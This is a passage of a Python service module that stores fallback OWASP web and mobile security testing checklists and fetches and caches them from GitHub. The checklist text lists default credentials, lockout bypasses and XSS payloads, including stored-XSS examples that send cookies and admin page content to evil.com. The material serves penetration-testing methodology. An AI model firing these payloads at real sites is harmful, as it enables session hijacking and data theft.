                'description': 'Verify the security of account provisioning and management processes.'
            },
            {
                'id': 'WSTG-ATHN-01',
                'title': 'Testing for Credentials Transported over an Encrypted Channel',
                'category': 'Authentication Testing',
                'description': '''Verify that user credentials are transmitted securely over encrypted channels.

▼ What to Test:
• Login forms submit over HTTPS
• Password reset and change forms use encryption
• Session tokens transmitted securely
• No credentials sent in URL parameters or headers over HTTP

▼ How to Test:
1. Intercept login requests: Use Burp Suite or OWASP ZAP
2. Check protocol: Ensure login URL starts with https://
3. Test mixed content: Verify no HTTP resources on HTTPS pages
4. Test redirect behavior: HTTP login should redirect to HTTPS
5. Verify secure flag on authentication cookies

▼ Testing Steps:
• Proxy traffic through Burp/ZAP during login process
• Check if login form has action="https://..."
• Look for secure cookie attributes in Set-Cookie headers
• Test if credentials can be submitted over HTTP
• Verify no credentials in Referer headers

▼ Risk Indicators:
• Login forms submitting over HTTP
• Credentials visible in browser history/logs
• Session tokens transmitted without encryption
• Mixed content warnings on authentication pages'''
            },
            {
                'id': 'WSTG-ATHN-02',
                'title': 'Testing for Default Credentials',
                'category': 'Authentication Testing',
                'description': '''Test for the presence of default or easily guessable credentials in the application.

▼ What to Test:
• Default admin accounts (admin/admin, admin/password)
• Vendor-specific default credentials
• Weak or common passwords
• Accounts created during installation or setup

▼ How to Test:
1. Try common username/password combinations
2. Check vendor documentation for default credentials
3. Test administrative interfaces and management consoles
4. Look for installation or setup pages with default accounts
5. Use credential lists like SecLists default passwords

▼ Common Default Credentials:
• admin/admin, admin/password, admin/123456
• root/root, administrator/administrator
• guest/guest, test/test, demo/demo
• Application-specific: oracle/oracle, sa/sa
• Device-specific: Cisco, HP, Dell default passwords

▼ Where to Test:
• Main application login
• Administrative interfaces (/admin, /console)
• Database management tools (phpMyAdmin)
• Web application firewalls and load balancers
• Any discovered management interfaces'''
            },
            {
                'id': 'WSTG-ATHN-03',
                'title': 'Testing for Weak Lock Out Mechanism',
                'category': 'Authentication Testing',
                'description': '''Verify that account lockout mechanisms are properly implemented and cannot be bypassed.

▼ What to Test:
• Account lockout threshold and duration
• Lockout bypass techniques
• CAPTCHA implementation effectiveness
• IP-based vs account-based lockout policies

▼ How to Test:
1. Attempt multiple failed logins: Test lockout threshold
2. Try lockout bypasses: IP rotation, user agent changes
3. Test different usernames: Verify lockout is per-account
4. Check lockout duration: Time-based vs permanent lockout
5. Test CAPTCHA: Verify it's properly implemented

▼ Bypass Techniques to Test:
• IP address rotation using proxies/VPNs
• Changing User-Agent headers between attempts
• Using different request formats (POST vs GET)
• Case variation in usernames (Admin vs admin)
• Adding extra parameters or headers

▼ Risk Indicators:
• No account lockout after multiple failed attempts
• Easy bypass using IP rotation or header changes
• Lockout mechanism affects only specific login methods
• CAPTCHA can be easily automated or bypassed'''
            },
            {
                'id': 'WSTG-SESS-01',
                'title': 'Testing for Session Management Schema',
                'category': 'Session Management Testing',
                'description': '''Analyze the session management implementation for security vulnerabilities.

▼ What to Test:
• Session token generation and randomness
• Session token length and complexity
• Session storage mechanism (cookies, URLs, hidden fields)
• Session lifecycle management

▼ How to Test:
1. Analyze session tokens: Check randomness and entropy
2. Test token predictability: Generate multiple sessions, analyze patterns
3. Check session storage: Look for tokens in URLs or hidden fields
4. Test session timeout: Verify idle and absolute timeouts
5. Session regeneration: Check if tokens change after login/privilege escalation

▼ Session Token Analysis:
• Collect 100+ session tokens and analyze for patterns
• Check token length: Should be at least 128 bits
• Test entropy: Use tools like Burp's Sequencer
• Verify tokens don't contain user information
• Check for session fixation vulnerabilities

▼ Tools for Testing:
• Burp Suite Sequencer for randomness analysis
• OWASP ZAP for session testing
• Custom scripts to collect and analyze tokens
• Browser developer tools to inspect session cookies'''
            },
            {
                'id': 'WSTG-SESS-02',
                'title': 'Testing for Cookies Attributes',
                'category': 'Session Management Testing',
                'description': '''Verify that session cookies have proper security attributes (HttpOnly, Secure, SameSite).

▼ What to Test:
• HttpOnly flag prevents JavaScript access
• Secure flag ensures HTTPS-only transmission
• SameSite attribute prevents CSRF attacks
• Cookie expiration and persistence settings

▼ How to Test:
1. Inspect Set-Cookie headers: Look for security flags
2. Test JavaScript access: Try document.cookie in console
3. Test HTTP/HTTPS behavior: Check if cookies sent over both
4. Browser testing: Test SameSite behavior across sites
5. Session persistence: Check if cookies persist after browser close

▼ Required Cookie Attributes:
• HttpOnly: Prevents XSS cookie theft
• Secure: Ensures transmission over HTTPS only
• SameSite=Strict/Lax: Prevents CSRF attacks
• Appropriate expiration time
• Path and Domain properly scoped

▼ Testing Methods:
• Browser Developer Tools → Application → Cookies
• Burp Suite → Proxy → HTTP History
• curl -I to check Set-Cookie headers
• JavaScript console: document.cookie (should not show HttpOnly cookies)'''
            },
            {
                'id': 'WSTG-SESS-03',
                'title': 'Testing for Session Fixation',
                'category': 'Session Management Testing',
                'description': '''Test for session fixation vulnerabilities in the authentication process.

▼ What to Test:
• Session token changes after authentication
• Pre-authentication session tokens accepted post-login
• Session token regeneration on privilege escalation
• URL-based session token handling

▼ How to Test:
1. Obtain session token before login
2. Login with valid credentials using that token
3. Check if the same token is valid after login
4. Test privilege escalation scenarios
5. Test session token in URLs vs cookies

▼ Testing Steps:
• Step 1: Visit login page, note session token
• Step 2: Login with valid credentials
• Step 3: Check if session token changed after login
• Step 4: Test if old token still works
• Step 5: Repeat for privilege escalation scenarios

▼ Vulnerability Indicators:
• Same session token before and after login
• Pre-authentication tokens accepted post-login
• Session tokens passed in URLs can be fixed
• No token regeneration on role/privilege changes'''
            },
            {
                'id': 'WSTG-INPV-01',
                'title': 'Testing for Reflected Cross Site Scripting',
                'category': 'Input Validation Testing',
                'description': '''Test for reflected Cross-Site Scripting (XSS) vulnerabilities in user input fields.

▼ What to Test:
• URL parameters reflected in response without encoding
• Form inputs that echo user input back to the page
• HTTP headers that are reflected in the response
• Error messages that include user input

▼ How to Test:
1. Identify reflection points: Find where input appears in output
2. Test basic payloads: <script>alert(1)</script>
3. Test encoding bypasses: Use different encoding techniques
4. Test context-specific payloads: HTML, JavaScript, CSS contexts
5. Verify execution: Check if JavaScript actually executes

▼ Common Test Payloads:
• <script>alert("XSS")</script>
• "><script>alert(1)</script>
• javascript:alert(1)
• <img src=x onerror=alert(1)>
• <svg onload=alert(1)>

▼ Testing Locations:
• URL parameters: ?q=<script>alert(1)</script>
• Form fields: Search boxes, contact forms
• HTTP headers: User-Agent, Referer, X-Forwarded-For
• File upload filenames and error messages

▼ Encoding Bypasses:
• URL encoding: %3Cscript%3E
• HTML entity encoding: &lt;script&gt;
• Double encoding: %253Cscript%253E
• Unicode encoding: \\u003cscript\\u003e'''
            },
            {
                'id': 'WSTG-INPV-02',
                'title': 'Testing for Stored Cross Site Scripting',
                'category': 'Input Validation Testing',
                'description': '''Test for stored Cross-Site Scripting (XSS) vulnerabilities that persist in the application.

▼ What to Test:
• Comment sections and user-generated content
• Profile fields and user settings
• File upload functionality with stored filenames
• Any data that persists and is displayed to other users

▼ How to Test:
1. Identify storage points: Find where data is saved and displayed
2. Submit XSS payloads: Use various JavaScript injection techniques
3. Verify persistence: Check if payload survives page reload
4. Test different user contexts: Admin vs regular user views
5. Check all locations where stored data appears

▼ High-Impact Locations:
• User profiles viewed by administrators
• Comment systems on popular pages
• Shared documents or collaborative features
• Email templates or notification systems
• Error logs viewed by administrators

▼ Advanced Payloads:
• <script>fetch('/admin/users').then(r=>r.text()).then(d=>location='//evil.com?'+btoa(d))</script>
• <img src=x onerror="this.src='//evil.com/steal?c='+document.cookie">
• <svg onload="eval(atob('base64_encoded_payload'))">'''
            }
        ]

    @staticmethod
    def _get_fallback_mstg_data():
        """Enhanced fallback MSTG data as backup"""
        return [
            {
                'id': 'MSTG-ARCH-1',
                'title': 'All app components are identified and known to be needed',
                'category': 'Architecture, Design and Threat Modeling Requirements',
                'description': '''Verify that all application components are identified, necessary, and that unused components are removed.

▼ What to Review:
• Application architecture documentation
• Third-party libraries and dependencies
• Unused code and dead functionality
• Development/debug components in production builds

▼ How to Test:
1. Code review: Analyze source code for unused imports and functions
2. Dependency analysis: Check package.json, Podfile, build.gradle
3. Binary analysis: Use tools to identify included libraries
4. Network analysis: Monitor app traffic to identify service calls
5. Static analysis: Use tools to detect dead code

▼ Mobile-Specific Checks:
• iOS: Check Info.plist for URL schemes and permissions
• Android: Review AndroidManifest.xml for components and permissions
• Verify only necessary permissions are requested
• Check for development certificates in production builds

▼ Tools for Analysis:
• iOS: otool, class-dump, Hopper Disassembler
• Android: APKTool, jadx, MobSF
• Static analysis: SonarQube, Checkmarx
• Dependency checking: OWASP Dependency Check'''
            },
            {
                'id': 'MSTG-ARCH-2',
                'title': 'Security controls are never enforced only on the client side',
                'category': 'Architecture, Design and Threat Modeling Requirements',
                'description': '''Ensure that security controls are enforced on a trusted remote endpoint and not solely on the client.

▼ What to Test:
• Authentication logic on client vs server
• Authorization checks and business logic validation
• Input validation and sanitization
• Cryptographic operations and key management

▼ How to Test:
1. Traffic interception: Use proxy tools to modify requests
2. Client-side bypass: Modify app behavior through debugging
3. API testing: Call backend APIs directly bypassing client
4. Business logic testing: Test critical operations through API
5. Authorization testing: Attempt privilege escalation

▼ Common Client-Side Only Issues:
• Authentication tokens validated only on client
• Price calculations done entirely in mobile app
• User role/permission checks only in UI
• Sensitive business logic implemented in client code
• Cryptographic keys hardcoded in the application

▼ Testing Approach:
• Intercept and modify all client-server communications
• Test if server validates all client inputs and requests
• Verify server-side authentication and authorization
• Check if bypassing client controls affects security
• Test edge cases and boundary conditions'''
            },
            {
                'id': 'MSTG-ARCH-3',
                'title': 'A high-level architecture has been defined and security has been addressed',
                'category': 'Architecture, Design and Threat Modeling Requirements',
                'description': '''Verify that a high-level architecture has been defined for the mobile app and all remote services.

▼ What to Review:
• Architecture diagrams and documentation
• Data flow diagrams showing sensitive data handling
• Trust boundaries and security controls
• Threat modeling and risk assessment documentation

▼ How to Test:
1. Documentation review: Check for architecture and security docs
2. Threat model validation: Verify threats have been identified
3. Security control mapping: Check controls address identified threats
4. Data flow analysis: Map sensitive data through the system
5. Attack surface analysis: Identify potential entry points

▼ Architecture Security Elements:
• Clear definition of trust boundaries
• Identification of sensitive data and assets
• Security controls at appropriate layers
• Secure communication protocols defined
• Key management and cryptographic architecture

▼ Documentation to Request:
• High-level architecture diagrams
• Threat modeling documentation
• Security requirements and controls
• Data classification and handling procedures
• Incident response and monitoring plans'''
            },
            {
                'id': 'MSTG-STORAGE-1',
                'title': 'System credential storage facilities are used appropriately',
                'category': 'Data Storage and Privacy Requirements',
                'description': '''Verify that system credential storage facilities are used appropriately to store sensitive data.

▼ What to Test:
• iOS Keychain usage for sensitive data
• Android Keystore/EncryptedSharedPreferences usage
• Proper access controls and protection levels
• Backup and export restrictions

▼ How to Test:
1. Static analysis: Check for proper storage API usage
2. Dynamic analysis: Monitor file system during app usage
3. Backup testing: Check if sensitive data appears in backups
4. Rooted/jailbroken testing: Access credential stores
5. Memory dumps: Check for sensitive data in memory

▼ Proper Storage Mechanisms:
• iOS: Keychain Services for passwords and keys
• Android: EncryptedSharedPreferences, Android Keystore
• Biometric authentication integration
• Hardware-backed security (TEE, Secure Enclave)

▼ Common Mistakes:
• Storing credentials in SharedPreferences (Android)
• Using NSUserDefaults for sensitive data (iOS)
• Hardcoding credentials in source code
• Not using appropriate protection classes
• Allowing credential backup to cloud services

▼ Testing Tools:
• iOS: Keychain-dumper, iMazing, 3uTools
• Android: ADB, sqlite3, shared_prefs analysis
• Frida scripts for runtime analysis
• Mobile security frameworks (MobSF, Needle)'''
            },
            {
                'id': 'MSTG-STORAGE-2',
                'title': 'No sensitive data is stored outside of the app container or system credential storage',
                'category': 'Data Storage and Privacy Requirements',
                'description': '''Ensure that sensitive data is not stored outside the app sandbox or system credential storage.

▼ What to Test:
• Data stored in external storage (SD card, shared directories)
• Information in system logs and crash dumps
• Temporary files and caches containing sensitive data
• Data shared with other applications

▼ How to Test:
1. File system analysis: Check external storage for app data
2. Log analysis: Review system logs for sensitive information
3. Cache inspection: Check temporary files and app caches
4. Memory dumps: Analyze RAM for sensitive data persistence
5. Inter-app communication: Test data sharing mechanisms

▼ Storage Locations to Check:
• Android: /sdcard/, /Android/data/, external cache
• iOS: Documents directory shared via iTunes, tmp directories
• System logs: logcat (Android), Console.app (iOS)
• Crash reports and debug information
• Shared preferences and configuration files

▼ Sensitive Data Types:
• User credentials and session tokens
• Personal information (PII)
• Cryptographic keys and certificates
• Business-critical data and trade secrets
• Location data and usage patterns

▼ Testing Commands:
• Android: adb shell find /sdcard -name "*appname*"
• iOS: Browse app container with tools like iMazing
• Check logs: adb logcat | grep -i password
• Memory analysis: Use Frida or similar tools'''
            },
            {
                'id': 'MSTG-STORAGE-3',
                'title': 'No sensitive data is written to application logs',
                'category': 'Data Storage and Privacy Requirements',
                'description': '''Verify that no sensitive data is written to application logs.

▼ What to Test:
• Application debug logs and console output
• System logs and crash reports
• Third-party logging frameworks
• Error handling and exception logging

▼ How to Test:
1. Log monitoring: Monitor logs during app usage
2. Static analysis: Search source code for logging statements
3. Runtime analysis: Use debugging tools to capture logs
4. Crash testing: Trigger errors and check crash reports
5. Third-party service logs: Check external logging services

▼ Common Logging Issues:
• Passwords and tokens in debug logs
• User input logged without sanitization
• Database queries with sensitive parameters
• Error messages containing sensitive context
• API responses logged in full detail

▼ Log Sources to Check:
• Android: Logcat output, app-specific logs
• iOS: Console.app, Xcode debug output
• Framework logs: Apache Cordova, React Native
• Third-party services: Crashlytics, Bugsnag
• Web view console logs

▼ Testing Approach:
• Enable verbose logging and monitor output
• Trigger error conditions to generate exception logs
• Check for sensitive data in stack traces
• Verify log sanitization and filtering
• Test different log levels and configurations'''
            },
            {
                'id': 'MSTG-CRYPTO-1',
                'title': 'The app does not rely on symmetric cryptography with hardcoded keys',
                'category': 'Cryptography Requirements',
                'description': '''Ensure the app does not rely on symmetric cryptography with hardcoded keys as a sole method of encryption.

▼ What to Test:
• Hardcoded encryption keys in source code or binaries
• Symmetric encryption used without proper key management
• Obfuscated keys that can be easily extracted
• Key derivation from predictable sources

▼ How to Test:
1. Static analysis: Search for hardcoded keys in source code
2. Binary analysis: Look for key patterns in compiled binaries
3. Runtime analysis: Monitor cryptographic operations
4. Reverse engineering: Extract keys from obfuscated code
5. Key derivation testing: Analyze key generation mechanisms

▼ Common Hardcoded Key Issues:
• AES keys embedded as string literals
• Base64 encoded keys in source code
• Keys derived from app version or device identifiers
• Same key used across all app installations
• Keys stored in easily accessible configuration files

▼ Proper Key Management:
• User-derived keys (from passwords/biometrics)
• Server-provided keys with secure exchange
• Hardware-backed key storage (TEE, Secure Enclave)
• Key derivation functions (PBKDF2, scrypt, Argon2)
• Per-user or per-session unique keys

▼ Analysis Tools:
• Strings command to find hardcoded values
• Hopper, IDA Pro for binary analysis
• MobSF for automated static analysis
• Frida for runtime key extraction'''
            }
        ]

    @staticmethod
    def _update_cache(data_type, source, count):
        """Update the cache information"""
        from app import db
        from app.models import OWASPDataCache
        
        cache_entry = OWASPDataCache.query.filter_by(data_type=data_type).first()
        if cache_entry:
            cache_entry.last_updated = utc_now()
            cache_entry.data_source = source
            cache_entry.test_count = count
        else:
            cache_entry = OWASPDataCache(
                data_type=data_type,
                data_source=source,
                test_count=count
            )
            db.session.add(cache_entry)
        db.session.commit()

    @staticmethod
    def get_cache_info():
        """Get cache information for all OWASP data types"""
        from app.models import OWASPDataCache
        
        cache_info = {}
        for data_type in ['wstg', 'mstg']:
            cache_entry = OWASPDataCache.query.filter_by(data_type=data_type).first()
            if cache_entry:
                cache_info[data_type] = {
                    'last_updated': cache_entry.last_updated,
                    'data_source': cache_entry.data_source,
                    'test_count': cache_entry.test_count
                }
            else:
                cache_info[data_type] = None
        
        return cache_info

    @staticmethod
    def get_cached_wstg_data():
        """Get WSTG data from JSON cache file, fallback to hardcoded data if not available"""
        print("Getting cached WSTG data for project creation...")
        
        # Try to load from cache file first
        cache_file = os.path.join(os.path.dirname(__file__), '..', '..', 'cache', 'wstg_cache.json')
        try:
            if os.path.exists(cache_file):
                with open(cache_file, 'r', encoding='utf-8') as f:
                    cached_data = json.load(f)
                    if cached_data and len(cached_data) > 10:
                        print(f"Using cached WSTG data: {len(cached_data)} tests")
                        return cached_data
        except Exception as e:
            print(f"Error loading WSTG cache file: {e}")
        
        # Fall back to hardcoded data
        print("Using fallback WSTG data")
        return OWASPService._get_fallback_wstg_data()

    @staticmethod
    def get_cached_mstg_data():
        """Get MASTG data from JSON cache file, fallback to hardcoded data if not available"""
        print("Getting cached MASTG data for project creation...")
        
        # Try to load from cache file first
        cache_file = os.path.join(os.path.dirname(__file__), '..', '..', 'cache', 'mstg_cache.json')
        try:
            if os.path.exists(cache_file):
                with open(cache_file, 'r', encoding='utf-8') as f:
                    cached_data = json.load(f)
                    if cached_data and len(cached_data) > 10:
                        print(f"Using cached MASTG data: {len(cached_data)} tests")
                        return cached_data
        except Exception as e:
            print(f"Error loading MASTG cache file: {e}")
        
        # Fall back to hardcoded data
        print("Using fallback MASTG data")
        return OWASPService._get_fallback_mstg_data()

    @staticmethod
    def _fetch_wstg_from_checklist():
        """Fetch WSTG data from the official checklist.md file"""
        try:
            # Use the raw GitHub URL to avoid API rate limits
            checklist_url = "https://raw.githubusercontent.com/OWASP/wstg/master/checklists/checklist.md"
            response = requests.get(checklist_url, timeout=30)
            
            if response.status_code != 200:
                print(f"Failed to fetch checklist.md: HTTP {response.status_code}")
                return []
            
            content = response.text
            wstg_tests = []
            
            # Parse the markdown table format
            lines = content.split('\n')
            current_category = ""
            
            for line in lines:
                line = line.strip()
                
                # Skip empty lines and headers
                if not line or line.startswith('#') or line.startswith('|---') or line.startswith('Note:'):
                    continue
                
                # Check for category headers (bold text in table)
                if '**WSTG-' in line and '**' in line:
                    # Extract category name
                    category_match = re.search(r'\*\*(WSTG-[A-Z]+)\*\*\s*\|\s*\*\*([^*]+)\*\*', line)
                    if category_match:
                        current_category = category_match.group(2).strip()
                    continue
                
                # Check for individual test items
                if line.startswith('|') and 'WSTG-' in line and not '**' in line:
                    # Parse table row: | WSTG-ID | Test Name | Status | Notes |
                    parts = [part.strip() for part in line.split('|')]
                    if len(parts) >= 3:
                        wstg_id = parts[1].strip()
                        test_name = parts[2].strip()
                        
                        # Validate WSTG ID format
                        if re.match(r'^WSTG-[A-Z]+-\d+$', wstg_id):
                            # Map category based on ID prefix
                            category_map = {
                                'INFO': 'Information Gathering',
                                'CONF': 'Configuration and Deployment Management Testing',
                                'IDNT': 'Identity Management Testing',
                                'ATHN': 'Authentication Testing',
                                'AUTHZ': 'Authorization Testing',
                                'SESS': 'Session Management Testing',
                                'INPV': 'Input Validation Testing',
                                'ERRH': 'Error Handling',
                                'CRYP': 'Cryptography',
                                'BUSL': 'Business Logic Testing',
                                'CLNT': 'Client-Side Testing',
                                'APIT': 'API Testing'
                            }
                            
                            category_code = wstg_id.split('-')[1] if '-' in wstg_id else 'MISC'
                            category = category_map.get(category_code, current_category or 'Miscellaneous Testing')
                            
                            # Generate description
                            description = f'''Security testing as per OWASP WSTG guidelines for {test_name.lower()}.

▼ What to Test:
• Review the specific functionality related to {test_name.lower()}
• Identify potential security weaknesses in implementation
• Test using both manual and automated approaches
• Verify proper security controls are in place

▼ How to Test:
• Follow OWASP WSTG methodology for this test case
• Use appropriate tools and techniques for the vulnerability type
• Document all testing steps and observations
• Capture evidence of any security issues found

▼ Documentation Required:
• Detailed test steps and methodology
• Screenshots or logs showing evidence
• Risk assessment and potential impact
• Specific remediation recommendations'''
                            
                            wstg_tests.append({
                                'id': wstg_id,
                                'title': test_name,
                                'category': category,
                                'description': description
                            })
            
            print(f"Parsed {len(wstg_tests)} tests from checklist.md")
            return sorted(wstg_tests, key=lambda x: x['id'])
            
        except Exception as e:
            print(f"Error fetching WSTG data from checklist: {e}")
            return []
    @staticmethod
    def _parse_mastg_test_file(file_info, headers):
        """Parse individual MASTG test file from GitHub"""
        try:
            # Get the raw content
            file_response = requests.get(file_info['download_url'], headers=headers, timeout=15)
            if file_response.status_code != 200:
                return None
            
            content = file_response.text
            
            # Extract MASTG-TEST ID from filename or content
            mastg_id_match = re.search(r'MASTG-TEST-\d{4}', file_info['name'])
            if not mastg_id_match:
                mastg_id_match = re.search(r'MASTG-TEST-\d{4}', content)
            
            if not mastg_id_match:
                return None
            
            mastg_id = mastg_id_match.group()
            
            # Extract title from first heading
            title_match = re.search(r'^#\s+(.+)$', content, re.MULTILINE)
            if title_match:
                title = title_match.group(1).strip()
                # Clean up title if it contains the ID
                title = re.sub(r'^' + re.escape(mastg_id) + r'\s*[-:]?\s*', '', title)
                title = re.sub(r'Test\s+' + re.escape(mastg_id) + r'\s*[-:]?\s*', '', title, flags=re.IGNORECASE)
                if not title or title == mastg_id:
                    title = f"Mobile Security Test {mastg_id.split('-')[-1]}"
            else:
                title = f"Mobile Security Test {mastg_id.split('-')[-1]}"
            
            # Extract full content for description - get everything from Overview to end or next major section
            full_description = ""
            
            # Try different section patterns
            desc_patterns = [
                r'## Overview\s*\n(.*?)(?=\n## (?:References|Static Analysis|Dynamic Analysis|Tools|See also|\Z))',
                r'## Summary\s*\n(.*?)(?=\n## (?:References|Static Analysis|Dynamic Analysis|Tools|See also|\Z))', 
                r'## Description\s*\n(.*?)(?=\n## (?:References|Static Analysis|Dynamic Analysis|Tools|See also|\Z))',
                r'## Overview\s*\n(.*?)(?=\n##|\Z)',
                r'## Summary\s*\n(.*?)(?=\n##|\Z)',
                r'## Description\s*\n(.*?)(?=\n##|\Z)'
            ]
            
            for pattern in desc_patterns:
                description_match = re.search(pattern, content, re.DOTALL)
                if description_match:
                    full_description = description_match.group(1).strip()
                    break
            
            # If no description found, try to get the content after the title
            if not full_description:
                # Get content after first heading until next major section
                after_title_match = re.search(r'^#\s+.+?\n(.*?)(?=\n## |\Z)', content, re.DOTALL | re.MULTILINE)
                if after_title_match:
                    full_description = after_title_match.group(1).strip()
            
            # If still no description, use a fallback
            if not full_description:
                full_description = "Mobile application security test as per OWASP MASTG guidelines."
            
            # Create a short summary for listing (first paragraph or 200 chars)
            description_lines = full_description.split('\n\n')
            description_summary = description_lines[0] if description_lines else full_description
            if len(description_summary) > 200:
                description_summary = description_summary[:200] + "..."
            
            # Determine category based on file path or content
            category = "General Mobile Security"
            if 'android' in file_info.get('path', '').lower():
                category = "Android Security Testing"
            elif 'ios' in file_info.get('path', '').lower():
                category = "iOS Security Testing"
            elif any(keyword in content.lower() for keyword in ['crypto', 'encryption']):
                category = "Cryptography"
            elif any(keyword in content.lower() for keyword in ['auth', 'session', 'login']):
                category = "Authentication and Session Management"
            elif any(keyword in content.lower() for keyword in ['network', 'communication', 'tls']):
                category = "Network Communication"
            elif any(keyword in content.lower() for keyword in ['storage', 'data', 'privacy']):
                category = "Data Storage and Privacy"
            
            return {
                'id': mastg_id,
                'title': title,
                'category': category,
                'description': description_summary,
                'full_description': full_description
            }
            
        except Exception as e:
            print(f"Error parsing MASTG test file {file_info['name']}: {e}")
            return None

    @staticmethod
    def _save_to_cache(data_type, data):
        """Save fetched data to JSON cache file"""
        try:
            # Create cache directory if it doesn't exist
            cache_dir = os.path.join(os.path.dirname(__file__), '..', '..', 'cache')
            os.makedirs(cache_dir, exist_ok=True)
            
            # Save to appropriate cache file
            cache_file = os.path.join(cache_dir, f'{data_type}_cache.json')
            with open(cache_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            
            print(f"Saved {len(data)} {data_type.upper()} tests to cache file: {cache_file}")
        except Exception as e:
            print(f"Error saving {data_type} data to cache: {e}")
